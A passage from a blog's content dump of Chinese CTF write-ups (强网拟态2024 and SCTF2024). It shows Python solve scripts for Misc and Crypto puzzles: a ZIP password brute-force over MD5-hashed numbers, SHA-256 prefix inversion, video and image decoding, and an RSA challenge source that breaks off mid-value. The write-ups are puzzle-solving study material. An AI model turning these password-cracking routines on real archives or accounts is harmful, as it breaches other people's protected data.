compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> number <span class="keyword">in</span> <span class="built_in">range</span>(start, end + <span class="number">1</span>):</span><br><span class="line">            password = md5_hash(number)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                zip_ref.extractall(path=tar,pwd=password.encode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;成功找到密码: <span class="subst">&#123;number&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">zip_file_path = <span class="string">&#x27;attachment\\how much.zip&#x27;</span></span><br><span class="line">ta=<span class="string">&#x27;attachment&#x27;</span></span><br><span class="line">start_number = <span class="number">100</span></span><br><span class="line">end_number = <span class="number">5000</span></span><br><span class="line">try_passwords(zip_file_path, start_number, end_number,ta)</span><br></pre></td></tr></table></figure><p>正确的答案是738</p><p>解压出来一个被旋转、裁剪过的二维码</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021154814455.png" alt="image-20241021154814455"></p><p>用gimp等等软件处理一下，恢复二维码原来的状态</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/屏幕截图-2024-10-19-161455.png" alt="屏幕截图-2024-10-19-161455" style="zoom: 50%;" /><p>扫出来一串奇怪的东西，结合文件名可以知道这是一种叫做malbolge的抽象语言</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021155224782.png" alt="image-20241021155224782" style="zoom:50%;" /><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021155431647.png" alt="image-20241021155431647"></p><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><blockquote><p>剩下的感觉都是一些脑洞题，想不到，真的想不到。。。</p></blockquote><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Find-way-to-read-video"><a href="#Find-way-to-read-video" class="headerlink" title="Find way to read video"></a>Find way to read video</h4><p>题目说tessa3098把一个邮件模板放在了一个公共平台上。经过寻找，我们可以在gitcode上找到要找的东西。</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021160529550.png" alt="image-20241021160529550"></p><p>这是一个垃圾邮件隐写，解码可以得到一个BV号和一串看起来是session cookie的东西，可以直接base64解码</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021161213574.png" alt="image-20241021161213574"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021161701421.png" alt="image-20241021161701421"></p><p>通过BV号在B站上可以搜到九十集视频，全部爬下来</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021161943757.png" alt="image-20241021161943757" style="zoom:50%;" /><blockquote><p>当时是卡在这了，注意到了视频上移动的小白点，但不知道要干什么</p></blockquote><p>预期解没看懂，但是有一种方法看懂了。base解码得到的那一堆十六进制数，经过尝试可以发现是不同字符的哈希值头几位，写脚本还原一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">fhl=[<span class="string">&quot;252f10c&quot;</span>,<span class="string">&quot;acac86c&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;cd0aa98&quot;</span>,<span class="string">&quot;021fb59&quot;</span>,<span class="string">&quot;ef2d127&quot;</span>,<span class="string">&quot;6b86b27&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;2c62423&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;2c62423&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;19581e2&quot;</span>,<span class="string">&quot;6b86b27&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;3f79bb7&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;ca97811&quot;</span>,<span class="string">&quot;252f10c&quot;</span>,<span class="string">&quot;18ac3e7&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;3973e02&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;2e7d2c0&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;4b22777&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;4e07408&quot;</span>,<span class="string">&quot;5feceb6&quot;</span>,<span class="string">&quot;ef2d127&quot;</span>,<span class="string">&quot;7902699&quot;</span>,<span class="string">&quot;18ac3e7&quot;</span>,<span class="string">&quot;d10b36a&quot;</span>,<span class="string">&quot;01ba471&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;6e340b9&quot;</span>,<span class="string">&quot;a318c24&quot;</span>,<span class="string">&quot;087d80f&quot;</span>,<span class="string">&quot;6b23c0d&quot;</span>,<span class="string">&quot;e596a8e&quot;</span>,<span class="string">&quot;18f5384&quot;</span>,<span class="string">&quot;e7f6c01&quot;</span>,<span class="string">&quot;d4735e3&quot;</span>,<span class="string">&quot;7a4a4b5&quot;</span>,<span class="string">&quot;ba5ec51&quot;</span>]</span><br><span class="line">ls=string.printable</span><br><span class="line"><span class="built_in">dict</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls:</span><br><span class="line">    ha=hashlib.sha256(i.encode()).hexdigest()</span><br><span class="line">    pre=ha[:<span class="number">7</span>]</span><br><span class="line">    <span class="built_in">dict</span>[pre]=i</span><br><span class="line">msg=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fhl:</span><br><span class="line">    ch=<span class="built_in">dict</span>.get(i)</span><br><span class="line">    <span class="keyword">if</span> ch:</span><br><span class="line">        msg+=ch</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163128597.png" alt="image-20241021163128597"></p><h4 id="Streaming"><a href="#Streaming" class="headerlink" title="Streaming"></a>Streaming</h4><p>追踪一下udp流，可以看到是在传一个h264视频</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163507342.png" alt="image-20241021163507342"></p><p>右键decode as改为rtp</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163552917.png" alt="image-20241021163552917"></p><p>可以看到DynamicRTP-Type-96，打开编辑-首选项，找到H.264，填入96</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163721533.png" alt="image-20241021163721533"></p><p>下载lua插件，提取H264视频</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163809591.png" alt="image-20241021163809591"></p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021163825827.png" alt="image-20241021163825827"></p><p>用milkplayer播放一下，可以看到第一段flag以及一个hint</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021164035877.png" alt="image-20241021164035877"></p><blockquote><p>当时是卡在了这，知道肯定是要用这个flag1做某种key去解密另一个文件，但是试了半天都不对。。。又是一个脑洞</p></blockquote><p>实际上这里是要先进行异或ff，然后再进行AES解密。（不知道怎么想到的。。。）</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021182144527.png" alt="image-20241021182144527"></p><p>解压出来两个没有后缀的文件，其中一个用trid识别出来是png，用<a href="https://github.com/GGN-2015/macos_shadow_tank?tab=readme-ov-file">这个项目</a>在linux下提取一下得到第二段flag</p><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021190938509.png" alt="image-20241021190938509" style="zoom:50%;" /><img src="/images/强网拟态2024-初赛Misc-Writeup-复现/image-20241021191008647.png" alt="image-20241021191008647" style="zoom:50%;" /><p>另一个文件用010打开发现又是H264视频，照着之前的264文件在前面补3个00</p><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021192709223.png" alt="image-20241021192709223"></p><p>播放后发现是黑白帧的交替，转换成01二进制串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">vc=cv2.VideoCapture(<span class="string">&quot;C:\\Users\\jyzho\\Desktop\\s4cret.264&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    ret,frame=vc.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    gf=cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)</span><br><span class="line">    <span class="keyword">if</span> cv2.countNonZero(gf):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;0&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024-%E5%88%9D%E8%B5%9BMisc-Writeup-%E5%A4%8D%E7%8E%B0/image-20241021193450835.png" alt="image-20241021193450835"></p><p>flag{3b3a9c08-88c4-4d65-b59e-13891ba324da}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 强网拟态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星盟训练合集（需要密码）</title>
      <link href="/2024/10/18/%E6%98%9F%E7%9B%9F%E8%AE%AD%E7%BB%83%E5%90%88%E9%9B%86/"/>
      <url>/2024/10/18/%E6%98%9F%E7%9B%9F%E8%AE%AD%E7%BB%83%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="15ac61c3f9a71c9d1958c71cff301a2c8062e0087a8405525304e776607666d0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御宛杯2024 Writeup</title>
      <link href="/2024/10/15/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024-Writeup/"/>
      <url>/2024/10/15/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 御宛杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2024 部分Writeup+复现</title>
      <link href="/2024/10/01/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/10/01/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>废了，只会签到，好好复现吧</p></blockquote><h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Fixlt"><a href="#Fixlt" class="headerlink" title="Fixlt"></a>Fixlt</h4><p>拿到一个文本文档，查看内容是 css 样式，搭配 html 渲染一下，得到如下内容。</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001173815118.png" alt="image-20241001173815118"></p><p>鼠标移上去，变成了aztec码的样子，但是不是很好扫，得写脚本处理一下，大概就是把除白色以外的所有像素点涂黑，然后再把横向和纵向黑色像素点间间距为1或2的部分涂黑</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001173906121.png" alt="image-20241001173906121"></p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001173919320.png" alt="image-20241001173919320"></p><p>随便找个解码器扫一下就行</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241001174008179.png" alt="image-20241001174008179"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="TerraWorld"><a href="#TerraWorld" class="headerlink" title="TerraWorld"></a>TerraWorld</h4><p>对wld文件strings可以直接找到六个压缩包的密码</p><img src="/images/SCTF2024-部分Writeup-复现/image-20241002131518727.png" alt="image-20241002131518727" style="zoom:50%;" /><p>对每个图片取中间十行像素上下拼接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">image_filenames = [<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(i).zfill(<span class="number">2</span>)&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(image_filenames[<span class="number">0</span>]) <span class="keyword">as</span> img:</span><br><span class="line">    width, height = img.size</span><br><span class="line"></span><br><span class="line">middle_start = (height - <span class="number">10</span>) // <span class="number">2</span></span><br><span class="line">middle_end = middle_start + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">cropped_images = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> image_filenames:</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(filename) <span class="keyword">as</span> img:</span><br><span class="line">        cropped_img = img.crop((<span class="number">0</span>, middle_start, width, middle_end))</span><br><span class="line">        cropped_images.append(cropped_img)</span><br><span class="line"></span><br><span class="line">total_height = <span class="built_in">sum</span>(img.height <span class="keyword">for</span> img <span class="keyword">in</span> cropped_images)</span><br><span class="line"></span><br><span class="line">result_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, total_height))</span><br><span class="line"></span><br><span class="line">current_y_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> cropped_images:</span><br><span class="line">    result_image.paste(img, (<span class="number">0</span>, current_y_offset))</span><br><span class="line">    current_y_offset += img.height</span><br><span class="line"></span><br><span class="line">result_image.save(<span class="string">&quot;combined_image.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;图像拼接完成，新图像已保存为 combined_image.png&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_images_vertically</span>(<span class="params">image_filenames, output_filename</span>):</span><br><span class="line"></span><br><span class="line">    images = [Image.<span class="built_in">open</span>(filename) <span class="keyword">for</span> filename <span class="keyword">in</span> image_filenames]</span><br><span class="line"></span><br><span class="line">    widths = <span class="built_in">set</span>([img.width <span class="keyword">for</span> img <span class="keyword">in</span> images])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(widths) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;所有图像必须具有相同的宽度&quot;</span>)</span><br><span class="line"></span><br><span class="line">    total_height = <span class="built_in">sum</span>(img.height <span class="keyword">for</span> img <span class="keyword">in</span> images)</span><br><span class="line"></span><br><span class="line">    new_image = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (images[<span class="number">0</span>].width, total_height))</span><br><span class="line"></span><br><span class="line">    current_y_offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> images:</span><br><span class="line">        new_image.paste(img, (<span class="number">0</span>, current_y_offset))</span><br><span class="line">        current_y_offset += img.height</span><br><span class="line"></span><br><span class="line">    new_image.save(output_filename)</span><br><span class="line"></span><br><span class="line">image_filenames = [<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.png&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>)]  <span class="comment"># 从1.png到6.png</span></span><br><span class="line"></span><br><span class="line">output_filename = <span class="string">&quot;stacked_image.png&quot;</span></span><br><span class="line"></span><br><span class="line">stack_images_vertically(image_filenames, output_filename)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;图像拼接完成，新图像已保存为 <span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到这样一张图片</p><img src="/images/SCTF2024-部分Writeup-复现/image-20241002134548945.png" alt="image-20241002134548945" style="zoom:50%;" /><p>但是由于出题人的失误，以上都没有用</p><p>用010看wld文件，可以发现里面还藏了第二个地图文件</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002134813182.png" alt="image-20241002134813182"></p><p>用地图编辑器tedit打开可以看到一个奇怪的字符串</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002134935187.png" alt="image-20241002134935187"></p><p>用cyberchef爆破可以发现异或密钥e时可以得到flag</p><p><img src="/images/SCTF2024-%E9%83%A8%E5%88%86Writeup-%E5%A4%8D%E7%8E%B0/image-20241002135126430.png" alt="image-20241002135126430"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbits</span>):</span><br><span class="line">        self.nbits = nbits</span><br><span class="line">        self.p, self.q = self.getPrimes()</span><br><span class="line">        self.n = self.p*self.q</span><br><span class="line">        self.Gift = self.Gift()</span><br><span class="line">        self.priv, self.pub = self.keyGen()</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">self</span>):</span><br><span class="line">        nbits = self.nbits</span><br><span class="line">        p = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        q = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">while</span> p == q:</span><br><span class="line">            q = random_prime(<span class="number">2</span>^(nbits-<span class="number">1</span>),lbound=<span class="number">2</span>^(nbits-<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span> p,q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Gift</span>(<span class="params">self</span>):</span><br><span class="line">        p,q = self.p, self.q</span><br><span class="line">        <span class="keyword">return</span> (p^<span class="number">2</span> + p + <span class="number">1</span>)*(q^<span class="number">2</span> + q + <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keyGen</span>(<span class="params">self</span>):</span><br><span class="line">        nbits = self.nbits</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            d = randint(<span class="number">2</span>^(nbits//<span class="number">4</span>),<span class="number">2</span>^(nbits//<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> gcd(d,self.Gift) != <span class="number">1</span>:</span><br><span class="line">                d = randint(<span class="number">2</span>^(nbits//<span class="number">4</span>),<span class="number">2</span>^(nbits//<span class="number">2</span>))</span><br><span class="line">            e = <span class="built_in">pow</span>(d,-<span class="number">1</span>,self.phi)</span><br><span class="line">            <span class="keyword">return</span> (self.p,self.q,self.n,e,d),(self.n,e)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">RRR = RSA(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">bp = long_to_bytes(<span class="built_in">int</span>(RRR.p))</span><br><span class="line">FLAG = <span class="string">&#x27;SCTF&#123;&#x27;</span>+md5(bp).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;N = <span class="subst">&#123;RRR.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;RRR.pub[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = 32261421478213846055712670966502489204755328170115455046538351164751104619671102517649635534043658087736634695616391757439732095084483689790126957681118278054587893972547230081514687941476504846573346232349396528794022902849402462140720882761797608629678538971832857107919821058604542569600500431547986211951</span></span><br><span class="line"><span class="string">e = 